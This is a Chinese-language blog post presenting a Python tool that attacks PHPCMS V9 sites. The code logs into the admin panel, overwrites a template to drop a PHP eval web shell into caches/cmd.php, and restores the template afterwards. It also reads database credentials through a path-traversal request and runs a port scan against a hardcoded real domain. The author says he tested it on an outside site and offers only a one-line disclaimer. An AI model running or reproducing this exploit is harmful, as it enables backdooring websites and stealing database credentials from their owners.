title: "Python版 phpcmsV9自动写shell工具"
id: 190
date: 2012-08-08 01:21:18
tags: 
- phpcmsv9漏洞
- python
categories: 
- 原创作品
- 技术文章
---



最近一直在学习python相关内容就顺手写个工具以作练习，上代码：
>注意：本程序具有攻击性，请勿用作非法用途，否则于本作者无关！

```python
#coding: GBK
'''
Created on 2012-8-2

@author: Return
'''
import cookielib
import urllib2,urllib
import re
import sys
import os
import socket
class getShell:

    rhost = ''                                  #远程目标主机
    cookieSavePath  = 'tmp/cookie/cookie.dat'   #cookie 保存位置
    codeSavePath    = 'tmp/code/code.png'       #code    保存位置
    phpShell        = '&lt;?php $shell = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;; file_put_contents(&quot;caches/cmd.php&quot;,$shell); ?&gt;' #一句话
    header          = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
    tmpPath         = ''    #临时地址存贮变量
    dataBaseInfo    = {}    #数据库信息
    postData        = {}    #post数据
    url             = ''    #远程url地址
    username        = ''    #用户名
    password        = ''    #用户密码
    vfCode          = ''    #验证码
    pc_hash         = ''    #phpcmsV9校验值
    result          = ''    #临时变量
    #==============================================================
    # __init__    初始化函数
    #==============================================================
    def __init__(self):
        self.cookie = cookielib.LWPCookieJar()
        urllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookie)))
    #==============================================================
    # login    登录
    #==============================================================
    def login(self):
        self.getVerifyCode()    #先获取验证码
        self.tmpPath  = '/index.php?m=admin&amp;c=index&amp;a=login&amp;dosubmit=1'
        self.postData = {
             'username':self.username,
             'password':self.password,
             'code':self.vfCode,
             'dosubmit':''
            }
        self.url = 'http://'+self.rhost+self.tmpPath
        self.result = self.urlPostData()

        if len(re.findall(&quot;登录成功&quot;,self.result)):
            self.pc_hash = re.search(&quot;(?&lt;=pc_hash=)(.+?)(?=')&quot;,self.result).group()
            print '登录成功'
            self.wirteShell() # 登陆成功后写入shell
        else:
            print '登录失败'
            print re.search('(330px&quot;&gt;)((.|n)*?)(?=&lt;/div&gt;)',self.result).group(2)
            self.login()
    def wirteShell(self):
        print '写入Shell...'
        tmpPath = '/index.php?m=template&amp;c=file&amp;a=edit_file&amp;style=default&amp;dir=search&amp;file=footer.html&amp;pc_hash='
        self.url = 'http://'+self.rhost+tmpPath+self.pc_hash   #v9中必须加上校验码，否则不能通过
        self.result = self.urlPostData()
        if len(re.findall('点击插入',self.result)):
            templateTmp = re.search(&quot;(&lt;te.*?&gt;)((.|n)*?)(&lt;.*?&gt;)&quot;,self.result).group(2)
            #提交写shell模版
            self.postData = {
                    'code':self.phpShell,
                    'dosubmit':'提交',
                    'pc_hash':self.pc_hash
                }
            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
            self.urlPostData()
            urllib2.urlopen('http://'+self.rhost+'/index.php?m=search').read()#访问模版页面生成shell
            #写回原模版
            self.postData = {
                    'code':templateTmp,
                    'dosubmit':'提交',
                    'pc_hash':self.pc_hash
                }
            self.url = 'http://'+self.rhost+tmpPath+self.pc_hash
            self.urlPostData()
        else:
            print '没有找到Search的foot模版...'
    #==============================================================
    # getVerifyCode    获取验证码
    #==============================================================
    def getVerifyCode(self):
        #验证码获取地址
        self.tmpPath = '/api.php?op=checkcode&amp;code_len=4&amp;font_size=20&amp;width=130&amp;height=50&amp;font_color=&amp;background='
        self.url = 'http://'+self.rhost+self.tmpPath
        open(self.codeSavePath,'wb').write(self.urlPostData())
        print '请输入验证码:'
        self.showPic()
        self.vfCode = sys.stdin.readline()

    #==============================================================
    # urlPostData    url Post提交数据
    #==============================================================
    def urlPostData(self):
        postData = urllib.urlencode(self.postData)
        req = urllib2.Request(
                          url = self.url,
                          data = postData,
                          headers = self.header
                          )
        result = urllib2.urlopen(req).read()
        self.saveCookie()
        self.delVariable()
        return result

    #==============================================================
    # getDataBaseInfo    获取数据库信息
    #==============================================================
    def getDataBaseInfo(self):
        #爆数据库信息地址
        self.tmpPath = '/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../caches/configs/database.php'
        self.url = 'http://'+self.rhost+self.tmpPath
        result = self.urlPostData()
        self.dataBaseInfo['hostName'] = re.search(&quot;(?&lt;='hostname' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['database'] = re.search(&quot;(?&lt;='database' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['username'] = re.search(&quot;(?&lt;='username' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['password'] = re.search(&quot;(?&lt;='password' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['tablepre'] = re.search(&quot;(?&lt;='tablepre' =&gt; ')(.*?)(?=',)&quot;,result).group()
        self.dataBaseInfo['type'] = re.search(&quot;(?&lt;='type' =&gt; ')(.*?)(?=',)&quot;,result).group()
    #==============================================================
    # printDbInfo    输出数据库信息
    #==============================================================
    def printDbInfo(self):
        print 'HostName:',self.dataBaseInfo['hostName']
        print 'DataBase:',self.dataBaseInfo['database']
        print 'UserName:',self.dataBaseInfo['username']
        print 'Password:',self.dataBaseInfo['password']
        print 'TablePre:',self.dataBaseInfo['tablepre']
        print 'DataType:',self.dataBaseInfo['type']
    #==============================================================
    # scanPort    端口扫描
    #==============================================================
    def scanPort(self):
        for p in range(80,8000):
            try:
                ip = 'www.gidigame.com'
                port = p
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((ip,port))
                print 'Port:',port,' open'
                s.close()
            except socket.error,msg:
                pass
                #print 'Port:',port,' close'
    #==============================================================
    # setRhost    设置目标主机
    #==============================================================
    def setRhost(self,host):
        self.rhost = host
    #==============================================================
    # getRhost    获取目标主机
    #==============================================================
    def getRhost(self):
        return self.rhost
    #==============================================================
    # setShell    自定义shell
    #==============================================================
    def setShell(self,shellCode):
        self.phpShell = shellCode
    #==============================================================
    # saveCookie    保存cookie值
    #==============================================================
    def saveCookie(self):
        self.cookie.save(self.cookieSavePath)
    #==============================================================
    # logMsg    日志信息，这里可以自己捕捉异常后处理信息
    #==============================================================
    def logMsg(self,msg):
        print msg
        exit()
    #==============================================================
    # showPic    用来显示验证码
    #==============================================================
    def showPic(self):
        imgPath = os.path.abspath(self.codeSavePath)
        os.system('rundll32.exe %SystemRoot%system32shimgvw.dll,ImageView_Fullscreen '+imgPath)
    #==============================================================
    # delVariable    清除变量，防止产生误差
    #==============================================================
    def delVariable(self):
        self.url            = ''
        self.tmpPath        = ''
        self.dataBaseInfo   = {}
        self.postData       = {}
        self.header         ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 QIHU 360EE'}
    #==============================================================
    # __del__    析构函数，类被注销时候调用
    #==============================================================
    def __del__(self):
        print 'Bye...'
def sysinfo():
    print '''
********************************************************************************
PHPcmsV9 自动写shell

功能：自动写入caches目录下cmd.php一句话 密码:cmd

Author: Return    Blog:www.creturn.com

Example: exp.py www.creutn.com username password
********************************************************************************
'''
#================================================================
# main    入口函数
#================================================================
def main():
    sysinfo();
    shell = getShell()
    if(len(sys.argv) &gt; 3):
        shell.setRhost(sys.argv[1])
        shell.username = sys.argv[2]
        shell.password = sys.argv[3]
	shell.login()
    else:
        print '参数不对！'

if __name__ == '__main__':
    main()
    
```
<!--more-->

使用说明，直接看实例截图：
运行程序后，输入目标地址如：www.creturn.com 用户名 密码

[![](http://asset.creturn.com/asset/uploads/2012/08/at_shell_1.png "at_shell_1")](http://asset.creturn.com/asset/uploads/2012/08/at_shell_1.png)

会自动用图片查看器打开验证码，然后输入验证码：

[![](http://asset.creturn.com/asset/uploads/2012/08/at_shell_2.png "at_shell_2")](http://asset.creturn.com/asset/uploads/2012/08/at_shell_2.png)

正确输入验证码后，程序会自动写入cache/cmd.php的一句话，由于找的一个测试外部站点，仅用了一些安全方面的函数因此一句话
就不能测试了，我就直接写入一个php文件输出一段文字：

[![](http://asset.creturn.com/asset/uploads/2012/08/at_shell_3.png "at_shell_3")](http://asset.creturn.com/asset/uploads/2012/08/at_shell_3.png)
